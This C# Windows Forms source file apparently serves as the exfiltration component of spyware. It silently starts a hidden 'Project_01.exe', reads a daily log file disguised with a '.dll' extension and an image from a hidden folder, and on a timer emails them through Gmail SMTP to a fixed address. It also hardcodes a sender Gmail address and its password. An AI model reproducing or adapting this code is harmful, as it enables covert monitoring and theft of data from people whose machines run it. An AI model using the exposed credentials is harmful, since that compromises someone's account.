using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net; //mail
using System.Net.Mail; // mail
using System.Runtime.InteropServices;//internet
using System.IO;
using System.Diagnostics;

namespace Send_Mail
{
    public partial class Form1 : Form
    {
        //internet(1)
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int conn, int val);
        public Form1()
        {
            InitializeComponent();
            Hidden();
        }
        #region Time_Current
        private void Form1_Load(object sender, EventArgs e)
        {
            //time current
            timer3.Start();
        }
        //time now
        string timeNow = DateTime.Now.ToLongTimeString();
        string dateNow = DateTime.Now.ToLongDateString();
        private void timer3_Tick(object sender, EventArgs e)
        {
            //time now
            label9.Text = DateTime.Now.ToLongTimeString();
            label8.Text = DateTime.Now.ToLongDateString();
        }
        #endregion
        #region create_Value
        private static int i = 0, a = 0, b = 0, c = 0, d = 0, qq = 0, tm = 0, lb10 = 0, lb11 = 0, succes = 0, wrong = 0;
        private static string imagePath = "Image_";
        private static string logName = "Log";
        private static string logExtendtion = ".dll";
        private static string heloName = "Helo123";
        private static string testing1 = Application.StartupPath + "\\Helo123\\a.png";
        #endregion
        #region Send_Mail
        private void Send_Mail_Tick(object sender, EventArgs e)
        {
            try
            {
                i++;
                label2.Text = "Time: " + i.ToString() + "/s";
                if (i == 100) //500ms = 1p
                {
                    #region From,To,Password,Body
                    i = 0;
                    b++;c++;
                    //from,to,pass
                    string from_address = "ducbk2k1@gmail.com";
                    string to_address = "haducvcvb@gmail.com";
                    string password = "#haduc25gm";
                    //send
                    MailMessage mail = new MailMessage();
                    mail.Subject = "Hello This is Testing";
                    mail.From = new MailAddress(from_address);
                    mail.Body = "TESTING :>> [" + c + "]\nTime: " + timeNow + "\nDate: " + dateNow;
                    mail.To.Add(new MailAddress(to_address));
                    #endregion
                    string dir_File = heloName;
                        if (Directory.Exists(dir_File))
                        {
                                succes++;
                                mail.Attachments.Add(new Attachment(testing1));
                                label13.Text = "Success: [" + succes + "]";
                        }
                        else
                        {
                            wrong++;
                            label12.Text = "Wrong: [" + wrong + "]";
                        }

                    //logFile
                    string logFile = logName + DateTime.Now.Day + DateTime.Now.Month + DateTime.Now.Year + logExtendtion;
                    if (File.Exists(logFile))
                    {
                        StreamReader sr = new StreamReader(logFile);
                        mail.Body += sr.ReadToEnd();
                        sr.Close();
                        lb11++;
                        label11.Text = "Success logFile [" + lb11 + "]";
                        label11.ForeColor = System.Drawing.Color.Green; // change color

                    }
                    else
                    {
                        lb10++;
                        label10.Text = "Wrong of logFile ["+lb10+"]";
                        label10.ForeColor = System.Drawing.Color.Red; // change color
                    }
                    //Smtp
                    SmtpClient smtp = new SmtpClient();
                    smtp.Host = "smtp.gmail.com";
                    smtp.Port = 587;
                    smtp.UseDefaultCredentials = false;
                    smtp.EnableSsl = true;
                    //Network
                    NetworkCredential netC = new NetworkCredential(from_address, password);
                    smtp.Credentials = netC;
                    smtp.Send(mail);
                    label4.Text = "Sent: [" + b + "]";
                }
                else
                {
                    a++;
                    label3.Text = "False: " + a;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        #endregion
        #region Check Internet
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            int Out;
            if (InternetGetConnectedState(out Out, 0) == true)
            {
                qq++;
                label6.Text = "Connected["+qq+"]";
                label6.ForeColor = System.Drawing.Color.Green; // change color
                Send_Mail.Start();
            }
            else
            {
                d++;
                label7.Text = "Not Connected["+d+"]";
                label7.ForeColor = System.Drawing.Color.Red; // change color
                Send_Mail.Stop();
            }

        }
        private void button1_Click(object sender, EventArgs e)
        {
            timer2.Start();
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            tm++;
            textBox1.Text = "" +tm.ToString();
        }
        #endregion
        #region Stop
        private void button2_Click(object sender, EventArgs e)
        {
            timer2.Stop();
            Send_Mail.Stop();
        }
        #endregion
        #region Hidden
        void Hidden() 
        {
            Process proC = new Process();
            proC.StartInfo.FileName = Application.StartupPath + "\\Project_01.exe";
            proC.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proC.Start();
        }
        #endregion
    }
}
